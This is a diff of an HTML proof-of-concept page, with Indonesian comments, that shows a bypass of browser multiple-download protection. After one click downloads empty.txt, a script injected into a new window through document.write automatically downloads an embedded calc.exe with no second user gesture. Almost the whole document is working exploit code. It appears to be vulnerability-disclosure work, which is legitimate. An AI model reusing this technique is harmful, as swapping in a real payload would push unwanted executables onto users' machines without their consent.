@@ -2,35 +2,82 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Bypass Multiple Download</title>
+    <title>Bypass Multiple Download - PoC</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
-        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+        body { font-family: system-ui, sans-serif; max-width: 560px; margin: 40px auto; text-align: center; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 15px; }
+        code { background: #f0f0f0; padding: 1px 5px; border-radius: 3px; }
+        .note { text-align: left; font-size: 13px; color: #444; background: #f7f7f7; padding: 12px; border-radius: 6px; margin-top: 20px; line-height: 1.5; }
     </style>
 </head>
 <body>
-    <h2>Bypass Multiple Download</h2>
+    <h2>Bypass Multiple Download (PoC)</h2>
+    <p>
+        File #1: <code>empty.txt</code> &mdash; triggered by user gesture (click)<br>
+        File #2: <code>calc.exe</code> &mdash; auto-downloaded without a 2nd user gesture
+    </p>
     <button onclick="run()">Execute Injection</button>
+
+    <div class="note">
+        <b>Impact:</b> Browsers guard against consecutive downloads (normally each download
+        requires its own user gesture). This PoC fires the first download from the click, then
+        injects a <i>second</i> download (an <code>.exe</code>) via <code>window.open</code> +
+        <code>document.write</code> without any additional user interaction &mdash; demonstrating a
+        multiple-download protection bypass and arbitrary <code>.exe</code> file write.
+    </div>
+
     <script>
-        function download(name, content) {
+        // Base64 of calc.exe (launcher that opens Windows Calculator) — benign PoC payload.
+        const EXE_B64 = '/* 4780 char base64 — sudah ter-embed di file final */';
+
+        function b64ToBytes(b64) {
+            const bin = atob(b64);
+            const bytes = new Uint8Array(bin.length);
+            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+            return bytes;
+        }
+
+        function downloadBytes(name, bytes) {
             const a = document.createElement('a');
-            // ↓↓↓ DIUBAH: tipe menjadi application/octet-stream agar disimpan sebagai .exe ↓↓↓
-            a.href = URL.createObjectURL(new Blob([content], { type: 'application/octet-stream' }));
+            a.href = URL.createObjectURL(new Blob([bytes], { type: 'application/octet-stream' }));
             a.download = name;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
         }
+
+        function downloadText(name, content) {
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' }));
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
         function run() {
-            // ↓↓↓ DIUBAH: nama file jadi calculator.exe, konten jadi batch script ↓↓↓
-            download('calculator.exe', '@echo off\nstart calc.exe');
+            // File #1: empty file (user gesture).
+            downloadText('empty.txt', '');
+
+            // File #2: .exe injected into a new window (no 2nd user gesture).
             setTimeout(() => {
                 const win = window.open('', '_blank');
                 if (win) {
-                    // ↓↓↓ DIUBAH: Ganti win.document.write + setTimeout dengan navigasi langsung ke blob URL ↓↓↓
-                    // Caranya lebih andal untuk memicu unduhan di browser modern
-                    win.location = URL.createObjectURL(new Blob(['@echo off\nstart calc.exe'], { type: 'application/octet-stream' }));
-                    // catatan: win.document.write dan close() dihilangkan karena tidak diperlukan untuk trigger unduhan
+                    win.document.write(`
+                        <script>
+                            setTimeout(() => {
+                                const bin = atob('${EXE_B64}');
+                                const bytes = new Uint8Array(bin.length);
+                                for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+                                const a = document.createElement('a');
+                                a.href = URL.createObjectURL(new Blob([bytes], { type: 'application/octet-stream' }));
+                                a.download = 'calc.exe';
+                                document.body.appendChild(a);
+                                a.click();
+                            }, 300);
+                        <\/script>
+                    `);
+                    win.document.close();
                 }
             }, 500);
         }
